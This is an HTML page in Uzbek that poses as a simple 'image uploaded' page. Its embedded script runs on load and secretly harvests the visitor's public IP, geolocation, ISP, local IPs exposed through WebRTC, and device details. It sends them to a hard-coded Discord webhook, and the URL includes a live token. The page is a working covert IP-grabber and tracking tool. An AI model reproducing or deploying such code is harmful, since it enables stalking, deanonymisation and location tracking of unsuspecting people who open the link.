<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasm Yuklash</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Rasm Yuklandi</h1>
        <img src="image.jpg" alt="Rasm" id="trackingImage">
        <p>Rasm muvaffaqiyatli yuklandi.</p>
    </div>

    <script>
        // Discord Webhook URL - O'zingizning URL'ingizni qo'ying
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
        
        // URL parametrlarini olish
        const urlParams = new URLSearchParams(window.location.search);
        const source = urlParams.get('source') || 'direct_access';
        
        console.log('üîç Rasm yuklanmoqda... Manba:', source);

        // Ma'lumotlarni yig'ish va yuborish
        async function collectAndSendData() {
            try {
                console.log('üì° Ma\'lumotlar yig\'ilmoqda...');
                
                // 1. Public IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIP = ipData.ip;
                
                // 2. Geolokatsiya
                let geoData = {};
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                    geoData = await geoResponse.json();
                } catch (e) {
                    console.log('Geolokatsiya xatosi:', e);
                }
                
                // 3. Local IP
                let localIPs = await getLocalIP();
                
                // 4. Qurilma ma'lumotlari
                const deviceInfo = getDeviceInfo();
                
                // 5. Discord'ga yuborish
                await sendToDiscord(publicIP, localIPs, geoData, deviceInfo, source);
                
                console.log('‚úÖ Ma\'lumotlar yuborildi');
                
            } catch (error) {
                console.error('‚ùå Xatolik:', error);
            }
        }

        // Local IP ni olish
        function getLocalIP() {
            return new Promise((resolve) => {
                let localIPs = "Aniqlanmadi";
                try {
                    const pc = new RTCPeerConnection({iceServers: []});
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    const ips = [];
                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (match) ips.push(match[1]);
                        }
                    };
                    
                    setTimeout(() => {
                        localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
                        resolve(localIPs);
                    }, 2000);
                    
                } catch (e) {
                    resolve('Xato: ' + e.message);
                }
            });
        }

        // Qurilma ma'lumotlari
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? 'Ha' : 'Yo\'q',
                java: navigator.javaEnabled ? 'Ha' : 'Yo\'q',
                pdf: navigator.pdfViewerEnabled ? 'Ha' : 'Yo\'q'
            };
        }

        // Discord'ga yuborish
        async function sendToDiscord(publicIP, localIPs, geoData, deviceInfo, source) {
            const now = new Date();
            
            let message = `üñºÔ∏è **RASM YUKLANDI**\\n\\n`;
            message += `üìÅ **Manba:** ${source}\\n`;
            message += `üïê **Vaqt:** ${now.toLocaleString()}\\n`;
            message += `üîó **URL:** ${window.location.href}\\n\\n`;
            
            message += `üåê **IP MA'LUMOTLARI**\\n`;
            message += `‚Ä¢ Public IP: ${publicIP}\\n`;
            message += `‚Ä¢ Local IP: ${localIPs}\\n\\n`;
            
            if (geoData.country) {
                message += `üó∫Ô∏è **GEOlOKATSIYA**\\n`;
                message += `‚Ä¢ Davlat: ${geoData.country_name || geoData.country}\\n`;
                message += `‚Ä¢ Shahar: ${geoData.city || 'Noma\'lum'}\\n`;
                message += `‚Ä¢ ISP: ${geoData.org || 'Noma\'lum'}\\n\\n`;
            }
            
            message += `üíª **QURILMA MA'LUMOTLARI**\\n`;
            message += `‚Ä¢ Brauzer: ${deviceInfo.userAgent.split(') ')[0] + ')'}\\n`;
            message += `‚Ä¢ Platforma: ${deviceInfo.platform}\\n`;
            message += `‚Ä¢ Ekran: ${deviceInfo.screen}\\n`;
            message += `‚Ä¢ Vaqt zonasi: ${deviceInfo.timezone}\\n`;
            
            // Discord chegarasi (2000 belgi)
            message = message.substring(0, 1900);
            
            const payload = {
                content: message
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Discord yuborish xatosi:', error);
            }
        }

        // Sahifa yuklanganda ishga tushirish
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ Sahifa yuklandi, ma\'lumotlar yuborilmoqda...');
            collectAndSendData();
        });

        // Rasm yuklanganida
        document.getElementById('trackingImage').onload = function() {
            console.log('‚úÖ Rasm yuklandi');
        };

        // Rasm yuklanmaganida
        document.getElementById('trackingImage').onerror = function() {
            console.log('‚ùå Rasm yuklanmadi');
        };
    </script>
</body>
</html>
